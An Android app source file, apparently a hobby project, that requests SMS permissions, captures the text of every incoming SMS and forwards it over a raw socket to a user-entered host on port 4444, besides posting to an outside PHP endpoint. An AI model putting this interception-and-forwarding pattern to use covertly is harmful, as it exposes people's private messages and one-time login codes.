package com.example.myapplication;
import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.telephony.SmsMessage;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.apptakk.http_request.HttpRequest;
import com.apptakk.http_request.HttpRequestTask;
import com.apptakk.http_request.HttpResponse;
import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.EOFException;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Array;
import java.net.Socket;
import java.util.Arrays;
import java.util.concurrent.TimeUnit;




class NewThread implements Runnable{
    public void run(){
        while(true) {

            System.out.println("thread is running...");

            try {
                TimeUnit.SECONDS.sleep(10); }
            catch(InterruptedException ex) {
                Thread.currentThread().interrupt(); }
        }
    }

}

public class MainActivity extends AppCompatActivity {

    public static final int REQUEST_READ_SMS = 80;
    public static final int RECEIVE_SMS = 81;
    private BroadcastReceiver smsReceiver;
    Object[] sms_arr = {};


    BufferedReader bufferedReader;
    Handler handler = new Handler();
    Thread checker;




    public static Object[] add(Object[] arr, Object... elements){
        Object[] tempArr = new Object[arr.length+elements.length];
        System.arraycopy(arr, 0, tempArr, 0, arr.length);

        for(int i=0; i < elements.length; i++)
            tempArr[arr.length+i] = elements[i];
        return tempArr;

    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        String host = String.valueOf((EditText)findViewById(R.id.editText));
        String username = String.valueOf((EditText)findViewById(R.id.editText2));


        // Проверка прав на получение смс
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(this,
                    Manifest.permission.READ_SMS)) {

            } else {
                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.READ_SMS},
                        REQUEST_READ_SMS);
            }
        } else {
            // Permission has already been granted
        }

        // Проверка прав на получение контактов
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.RECEIVE_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(this,
                    Manifest.permission.RECEIVE_SMS)) {

            } else {
                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.RECEIVE_SMS},
                        RECEIVE_SMS);
            }
        } else {
            // Permission has already been granted
        }
        // Проверка прав на получение контактов
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.INTERNET)
                != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(this,
                    Manifest.permission.INTERNET)) {

            } else {
                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.INTERNET},
                        78);
            }
        } else {
            // Permission has already been granted
        }

        initializeSMSReceiver();
        registerSMSReceiver();

       String tex = "rrrer";

        new HttpRequestTask(
                new HttpRequest("http://www.denbrown.beget.tech/sms_receive.php",
                        HttpRequest.POST, "{ \"some\": \"data\" }"),
                new HttpRequest.Handler() {
                    @Override
                    public void response(HttpResponse response) {
                        if (response.code == 200) {
                            Log.d(this.getClass().toString(), "Request successful!");
                        } else {
                            Log.e(this.getClass().toString(), "Request unsuccessful: " + response);
                        }
                    }
                }).execute();

    }

    private void initializeSMSReceiver() {
        smsReceiver = new BroadcastReceiver(){
            @Override
            public void onReceive(Context context, Intent intent) {

                Bundle bundle = intent.getExtras();
                if(bundle!=null){
                    Object[] pdus = (Object[])bundle.get("pdus");
                    for(int i=0;i<pdus.length;i++){
                        byte[] pdu = (byte[])pdus[i];
                        SmsMessage message = SmsMessage.createFromPdu(pdu);
                        String text = message.getDisplayMessageBody();
                        Object[] objArr = add(sms_arr, text);
                        sms_arr = objArr;
                        Log.i("log", text);
                        SendSocket(text, 4444);

                    }
                }
            }
        };
    }

    private void registerSMSReceiver(){
        IntentFilter intentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        registerReceiver(smsReceiver, intentFilter);
    }

    public void onMyButtonClick(View view) {
        SendSocket("Connect OK", 4444);
        Toast.makeText(this, "fffff", Toast.LENGTH_SHORT).show();

    }

    public void StartButton(View view) {
        System.out.println("Button start");
        SendSocket("start", 4443);

        try { TimeUnit.SECONDS.sleep(2); }
        catch (
            InterruptedException ex) {
            Thread.currentThread().interrupt(); }

        Runnable cmd_sender = new Runnable() {
            @Override
            public void run(){
                while (true) {
                     while(!Thread.currentThread().isInterrupted()) {

                        SendSocket("check", 4443);

                        try {
                            TimeUnit.SECONDS.sleep(10);
                        } catch (InterruptedException ex) {
                            Thread.currentThread().interrupt();
                        }
                    }
                }
        }};


        checker = new Thread(cmd_sender);
        checker.start();

    }

    public void StopButton(View view) {
        System.out.println("Button stop");
        SendSocket("stop", 4443);
        checker.interrupt();
        TextView status = findViewById(R.id.textView2);
        status.setText("Stopped");

    }

    public void get_command(final String text, final String response){

        if(text == "check"){

            TextView status = findViewById(R.id.textView2);
            status.setText(response);
        }

    }

    public void SendSocket(final String text, final int port){
        Runnable runnable = new Runnable() {
            @Override
            public void run() {
                try{
                    System.out.println(Arrays.toString(sms_arr));


                    final EditText edit = findViewById(R.id.editText);
                    String host = edit.getText().toString();

                    final EditText edit2 =  findViewById(R.id.editText2);
                    String username = edit2.getText().toString();

                    Socket s = new Socket(host , port);

                    DataOutputStream dos;

                    dos = new DataOutputStream(s.getOutputStream());

                    String message = "us:"+username+";"+text+";end#";

                    dos.writeUTF(message);

                    try {

                        InputStream stream1 = s.getInputStream();
                        byte[] data = new byte[100];
                        int count = stream1.read(data);
                        String response = new String(data).substring(0, count);

                        System.out.println(response);

                        get_command(text, response);


                    }
                    catch (EOFException e){
                        System.out.println("error "+e.toString());

                    }

                    dos.close();
                    s.close();

                }catch (IOException e){
                    e.printStackTrace();
                    Log.e("error", "error");
                    System.out.println(e.toString());
                }

            }};


        Thread thread = new Thread(runnable);
        thread.start(); }



}
